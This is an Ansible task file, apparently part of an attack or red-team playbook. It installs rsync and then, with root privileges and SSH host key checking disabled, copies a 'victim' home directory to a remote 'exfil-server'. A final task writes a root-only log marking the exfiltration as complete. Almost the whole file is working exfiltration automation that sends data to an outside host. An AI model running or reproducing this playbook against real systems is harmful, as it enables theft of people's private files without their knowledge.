---
- name: Ensure rsync is installed
  apt:
    name: rsync
    state: present
    update_cache: yes

- name: Exfiltrate victim home directory to exfil-server
  shell: |
    rsync -az --timeout=30 \
      -e "ssh -o BatchMode=yes -o StrictHostKeyChecking=no -i {{ ssh_key_path }}" \
      {{ source_path }} \
      {{ exfil_user }}@{{ exfil_host }}:{{ exfil_path }}
  become: yes
  ignore_errors: yes

- name: Write exfil completion log
  copy:
    dest: "{{ exfil_log }}"
    owner: root
    group: root
    mode: '0600'
    content: "{{ ansible_date_time.iso8601 }} [EXFIL] COMPLETE src={{ source_path }} dst={{ exfil_user }}@{{ exfil_host }}:{{ exfil_path }}\n"
